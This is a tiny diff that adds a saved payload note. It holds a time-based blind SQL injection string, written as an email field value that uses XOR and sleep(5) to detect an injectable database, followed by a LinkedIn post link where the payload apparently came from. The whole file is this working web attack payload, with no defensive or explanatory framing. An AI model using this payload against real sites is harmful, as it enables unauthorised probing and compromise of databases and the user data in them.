@@ -1,0 +1,4 @@
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
+
+https://www.linkedin.com/posts/ibrahim-h-101430102_emailtestgmailcomxorifnowsysdate-activity-7057344209942380545-fQN2
